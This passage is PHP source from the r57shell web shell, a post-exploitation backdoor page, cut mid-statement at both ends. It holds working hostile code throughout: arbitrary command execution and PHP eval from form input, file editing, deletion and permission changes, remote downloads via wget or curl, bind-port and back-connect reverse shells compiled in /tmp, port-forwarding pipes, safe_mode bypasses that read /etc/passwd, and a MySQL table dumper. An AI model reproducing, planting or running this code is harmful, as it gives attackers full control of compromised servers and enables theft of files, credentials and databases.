else if (!empty($lin1)&&!empty($lin2)) {$sysctl = "$lin1 $lin2"; }
else { $sysctl = "-"; }
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
$id = ex('id');
echo((!empty($id))?(ws(3).$id."<br>"):(ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>"));
echo ws(3).$dir;
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@get_current_user()."<br>";
echo ws(3).$dir."<br>";
echo "</font>";
}
echo "</font>";
echo "</td></tr></table>";
if(empty($c1)||empty($c2)) { die(); }
$f = '<br>';
$f  = base64_decode($c1);
$f .= base64_decode($c2);
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* find text */
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* chmod/chown/chgrp */
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;

   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;

   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* make */
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;

     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* edit file */
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file")
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name size=85 value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd size=85 value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* save file */
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 if(!$file=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 @fwrite($file,$_POST['e_text']);
 @fclose($file);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* port bind C */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* port bind Perl */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* back connect Perl */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* back connect C */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* datapipe perl */
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* datapipe C */
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* alias execute */
if (!empty($_POST['alias']))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($_POST['alias'] == $alias_name) {$_POST['cmd']=$alias_cmd;}
                                               }
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* file upload */
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* file upload from remote host */
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $p2=which("wget");
 if(empty($p2)) $p2="wget";
 $_POST['cmd'] = $p2." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;

 case fetch:
 $p2=which("fetch");
 if(empty($p2)) $p2="fetch";
 $_POST['cmd']= $p2." -p ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;

 case lynx:
 $p2=which("lynx");
 if(empty($p2)) $p2="lynx";
 $_POST['cmd']= $p2." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;

 case links:
 $p2=which("links");
 if(empty($p2)) $p2="links";
 $_POST['cmd']= $p2." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;

 case GET:
 $p2=which("GET");
 if(empty($p2)) $p2="GET";
 $_POST['cmd']= $p2." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;

 case curl:
 $p2=which("curl");
 if(empty($p2)) $p2="curl";
 $_POST['cmd']= $p2." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* command execute */
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=121 rows=15>";

// safe_mode On
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':  // dir listing
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if($windows){ // WINDOWS STYLE
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ // UNIX STYLE
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo $lang[$language._text29];
 break;

 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $file = @file($_POST['file']);
   if($file)
    {
    $c = @sizeof($file);
    for($i=0;$i<$c;$i++) { echo htmlspecialchars($file[$i]); }
    }
   else echo $lang[$language._text29];
   }
  else echo $lang[$language._text31];
  break;

  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;

  case 'test2':
  include($_POST['test2_file']);
  break;

  case 'test3':
  $db = @mysql_connect('localhost',$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
     $sql = "CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );";
     @mysql_query($sql);
     $sql = "LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table;";
     @mysql_query($sql);
     $sql = "SELECT * FROM temp_r57_table;";
     $r = @mysql_query($sql);
     while($r_sql = @mysql_fetch_array($r)) { echo @htmlspecialchars($r_sql[0]); }
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
 } // end : switch($_POST['cmd'])

} // end : if($safe_mode)

// safe_mode Off
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump"))
{
 $cmd_rep = ex($_POST['cmd']);
 if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }


}

// íå çàâèñèò îò ñåéôà
if ($_POST['cmd']=="php_eval")
 {
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);
 }
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* mysql äàìï */
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){
  $db = @mysql_connect('localhost',$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {

   if(@mysql_select_db($_POST['mysql_db'],$db))
    {
     // èíôà î äàìïå
     $sql1  = "# MySQL dump created by r57shell\r\n";
     $sql1 .= "# homepage: http://rst.void.ru\r\n";
     $sql1 .= "# ---------------------------------\r\n";
     $sql1 .= "#     date : ".date ("j F Y g:i")."\r\n";
     $sql1 .= "# database : ".$_POST['mysql_db']."\r\n";
     $sql1 .= "#    table : ".$_POST['mysql_tbl']."\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     // ïîëó÷àåì òåêñò çàïðîñà ñîçäàíèÿ ñòðóêòóðû òàáëèöû
     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
     $row   = @mysql_fetch_row($res);
     $sql1 .= $row[1]."\r\n\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     $sql2 = '';

     // ïîëó÷àåì äàííûå òàáëèöû
     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
     if (@mysql_num_rows($res) > 0) {
     while ($row = @mysql_fetch_assoc($res)) {
     $keys = @implode("`, `", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".$values."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
    // ïèøåì â ôàéë èëè âûâîäèì â áðàóçåð
    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
    else { echo $sql1.$sql2; }
    } // end if(@mysql_select_db($_POST['mysql_db'],$db))

    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   } // end if($db)
  else echo "[-] ERROR! Can't connect to mysql server";
 } // end if(($_POST['dif']&&$fp)||(!$_POST['dif'])){
 else if(!empty($_POST['dif'])&&!$fp) { echo "[-] ERROR! Can't write in dump file"; }
 } // end if ($_POST['cmd']=="mysql_dump")

echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
//////// start table
echo "<table width=100% cellpadding=0 cellspacing=0>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* command execute form */
if(!$safe_mode){
echo "<form name=command method=post>";
echo $table_up1; echo $lang[$language.'_text2']; echo $table_up2;
echo $font;
echo "<b>".ws(1).$lang[$language.'_text3'].$arrow.ws(4)."</b>";
echo "<input type=text name=cmd size=85>".ws(2)."<br>";
echo "<b>".ws(1).$lang[$language.'_text4'].$arrow.ws(4)."</b>";
echo "<input type=text name=dir size=85 value=".$dir.">";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt1']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* safe_mode form */
if($safe_mode){
echo "<form name=safe_ls method=post>";
echo $table_up1; echo $lang[$language.'_text28']; echo $table_up2;
echo $font;
// dir
echo "<b>".ws(1).$lang[$language.'_text4'].$arrow.ws(4)."</b>";
echo "<input type=text name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=safe_dir>";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt6']." \"></form>";
echo "<form name=safe_cat method=post>";
echo "<b>".ws(9).$lang[$language.'_text30'].$arrow.ws(4)."</b>";
echo "<input type=text name=file size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=safe_file>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt7']." \"></font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* edit_file form */
echo "<form name=edit_file method=post>";
echo $table_up1; echo $lang[$language.'_text42']; echo $table_up2;
// dir
echo $font;
echo "<b>".$lang[$language.'_text43'].$arrow.ws(4)."</b>";
echo "<input type=text name=e_name size=85 value=";
echo (!empty($_POST['e_name'])?($_POST['e_name']):($dir));
echo ">";
echo "<input type=hidden name=cmd size=85 value=edit_file>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt11']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* mk/del dir/file form */
if($safe_mode){
echo "<form name=mk method=post>";
echo $table_up1; echo $lang[$language.'_text57']; echo $table_up2;
// dir
echo $font;
echo ws(24)."<b>".$lang[$language.'_text58'].$arrow.ws(4)."</b>";
echo "<input type=text name=mk_name size=54 value=";
echo (!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"));
echo ">";
echo ws(2)."<select name=action>";
echo "<option value=create>".$lang[$language.'_text65']."</option>";
echo "<option value=delete>".$lang[$language.'_text66']."</option>";
echo "</select>";
echo ws(2)."<select name=what>";
echo "<option value=file>".$lang[$language.'_text59']."</option>";
echo "<option value=dir>".$lang[$language.'_text60']."</option>";
echo "</select>";
echo "<input type=hidden name=cmd size=85 value=mk>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt13']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* change perm form */
if($safe_mode && $unix){
echo "<form name=ch method=post>";
echo $table_up1; echo $lang[$language.'_text67']; echo $table_up2;
// dir
echo $font;
echo ws(14)."<b>".$lang[$language.'_text69'].$arrow.ws(4)."</b>";
echo "<input type=text name=param1 size=40 value=";
echo (($_POST['param1'])?($_POST['param1']):("filename"));
echo ">";
echo ws(2)."<b>".$lang[$language.'_text70'].$arrow.ws(4)."</b>";
echo "<input type=text name=param2 size=26 value=";
echo (($_POST['param2'])?($_POST['param2']):("0777"));
echo " title='".$lang[$language.'_text71']."'><br>";
echo "<input type=hidden name=cmd size=85 value=ch_>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(15)."<b>".$lang[$language.'_text68'].$arrow.ws(4)."</b>";
echo ws(2)."<select name=what>";
echo "<option value=mod>CHMOD</option>";
echo "<option value=own>CHOWN</option>";
echo "<option value=grp>CHGRP</option>";
echo "</select>";
echo ws(87)."<input type=submit name=submit value=\" ".$lang[$language.'_butt1']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* aliases form */
if(!$safe_mode){
echo "<form name=aliases method=POST>";
echo $table_up1; echo $lang[$language.'_text7']; echo $table_up2;
echo $font;
echo "<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt1']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* search text form */
echo "<form name=search_text method=post>";
echo $table_up1; echo $lang[$language.'_text54']; echo $table_up2;
echo $font;
echo ws(5)."<b>".$lang[$language.'_text52'].$arrow.ws(4)."</b>";
echo "<input type=text name=s_text size=85 value=\"text\"><br>";
echo ws(8)."<b>".$lang[$language.'_text53'].$arrow.ws(4)."</b>";
echo "<input type=text name=s_dir size=85 value=".$dir."> * ( /root;/home;/tmp )<br>";
echo ws(5)."<b>".$lang[$language.'_text55'].$arrow.ws(4)."</b>";
echo "<input type=checkbox name=m value=1 id=m>";
echo "<input type=text name=s_mask size=82 value=.txt;.php>  * ( .txt;.php;.htm )";
echo "<input type=hidden name=cmd size=85 value=search_text>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<br><div align=center><input type=submit name=submit value=\" ".$lang[$language.'_butt12']." \"></div>";
echo "</font>";
echo $table_end1;
echo "</form>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* search text with find form */
echo "<form name=search_text method=post>";
echo $table_up1; echo $lang[$language.'_text76']; echo $table_up2;
echo $font;
echo ws(5)."<b>".$lang[$language.'_text72'].$arrow.ws(4)."</b>";
echo "<input type=text name=s_text size=85 value=\"text\"><br>";
echo ws(8)."<b>".$lang[$language.'_text73'].$arrow.ws(4)."</b>";
echo "<input type=text name=s_dir size=85 value=".$dir."> * ( /root;/home;/tmp )<br>";
echo ws(6)."<b>".$lang[$language.'_text74'].$arrow.ws(4)."</b>";
echo "<input type=text name=s_mask size=85 value=*.[hc]>".ws(1).$lang[$language.'_text75'];
echo "<input type=hidden name=cmd size=85 value=find_text>";
echo "<input type=hidden name=dir value=".$dir.">";
echo ws(1)."<br><div align=center><input type=submit name=submit value=\" ".$lang[$language.'_butt12']." \"></div>";
echo "</font>";
echo $table_end1;
echo "</form>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* php eval form */
echo "<form name=php method=post>";
echo $table_up1; echo $lang[$language.'_text32']; echo $table_up2;
echo $font;
echo "<div align=center><textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=php_eval>";
echo "<br>".ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt1']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* php safe_mode break test 1 form */
if($safe_mode&&$curl_on)
{
echo "<form name=test1 method=post>";
echo $table_up1; echo $lang[$language.'_text33']; echo $table_up2;
echo $font;
echo "<b>".ws(9).$lang[$language.'_text30'].$arrow.ws(4)."</b>";
echo "<input type=text name=test1_file size=85 value=";
echo (!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"));
echo ">";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=test1>";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt8']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* php safe_mode break test 2 form */
if($safe_mode)
{
echo "<form name=test2 method=post>";
echo $table_up1; echo $lang[$language.'_text34']; echo $table_up2;
echo $font;
echo "<b>".ws(9).$lang[$language.'_text30'].$arrow.ws(4)."</b>";
echo "<input type=text name=test2_file size=85 value=";
echo (!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"));
echo ">";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=test2>";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt8']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* php safe_mode break test 3 form */
if($safe_mode&&$mysql_on)
{
echo "<form name=test3 method=post>";
echo $table_up1; echo $lang[$language.'_text35']; echo $table_up2;
echo $font;
echo "<b>".ws(27).$lang[$language.'_text36'].$arrow.ws(4)."</b>";
echo "<input type=text name=test3_md size=15 value=";
echo (!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"));
echo ">";
echo "<b>".ws(13).$lang[$language.'_text37'].$arrow.ws(4)."</b>";
echo "<input type=text name=test3_ml size=15 value=";
echo (!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"));
echo ">";
echo "<b>".ws(12).$lang[$language.'_text38'].$arrow.ws(4)."</b>";
echo "<input type=text name=test3_mp size=15 value=";
echo (!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"));
echo ">";
echo "<br><b>".ws(9).$lang[$language.'_text30'].$arrow.ws(4)."</b>";
echo "<input type=text name=test3_file size=85 value=";
echo (!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"));
echo ">";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=test3>";
echo ws(1)."<input type=submit name=submit value=\" ".$lang[$language.'_butt8']." \">";
echo "</font>";
echo $table_end1;
echo "</form>";
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
/* file upload form */
